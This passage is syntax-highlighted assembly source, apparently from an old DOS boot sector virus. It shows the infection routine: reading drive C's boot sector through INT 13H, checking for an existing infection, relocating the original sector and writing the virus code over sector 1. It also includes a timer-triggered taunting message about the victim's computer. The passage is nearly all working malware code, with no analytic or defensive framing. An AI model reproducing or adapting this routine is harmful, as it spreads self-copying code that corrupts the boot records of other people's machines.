</span><span class="sc5">BP0130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                 </span><span class="sc1">; Side one, drive A</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BP0150</span><span class="sc0">                  </span><span class="sc1">; Branch if error</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">BB046C</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; Test low byte of time</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">BP0140</span><span class="sc0">                  </span><span class="sc1">; Branch if not 7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MESSAGE</span><span class="sc0">       </span><span class="sc1">; Load message address</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0090</span><span class="sc0">                  </span><span class="sc1">; Display message</span><span class="sc0">
</span><span class="sc5">BP0140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">                 </span><span class="sc1">; Read one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; C-disk boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                  </span><span class="sc1">; Side zero, drive C</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BP0150</span><span class="sc0">                  </span><span class="sc1">; Branch if error</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; C-disk boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Start of program</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Get first word</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Compare to C-disk</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0160</span><span class="sc0">                  </span><span class="sc1">; Install on C-disk if different</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get second word</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Compare to C-disk</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0160</span><span class="sc0">                  </span><span class="sc1">; Install on C-disk if different</span><span class="sc0">
</span><span class="sc5">BP0150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">DRIVEN</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Drive A</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">DUMMY</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BOOTST</span><span class="sc0">                  </span><span class="sc1">; Pass control to boot sector</span><span class="sc0">
 
</span><span class="sc1">;               Install on C-disk</span><span class="sc0">
 
</span><span class="sc5">BP0160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">DRIVEN</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; Drive C</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">DUMMY</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">                 </span><span class="sc1">; Write one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; C-disk boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                  </span><span class="sc1">; side zero, drive C</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BP0150</span><span class="sc0">                  </span><span class="sc1">; Branch if error</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc4">+</span><span class="sc2">200H</span><span class="sc0">   </span><span class="sc1">; Target offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">        </span><span class="sc1">; Source offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc4">-</span><span class="sc2">400H</span><span class="sc0">   </span><span class="sc1">; Length to move</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; Copy C-disk boot sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">                 </span><span class="sc1">; Write one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Write this sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                  </span><span class="sc1">; Side zero, drive C</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0150</span><span class="sc0">            </span><span class="sc1">; Pass control to boot sector</span><span class="sc0">
 
</span><span class="sc5">MESSAGE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Old DICKs don'</span><span class="sc5">t</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc0">!</span><span class="sc13">', 7, 0DH, 0AH, 0AH, 0
</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Neither does your computer'</span><span class="sc0">
 
</span><span class="sc5">ENDADR</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
 
</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">
 
        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
 
 
</span></div></body>
</html>
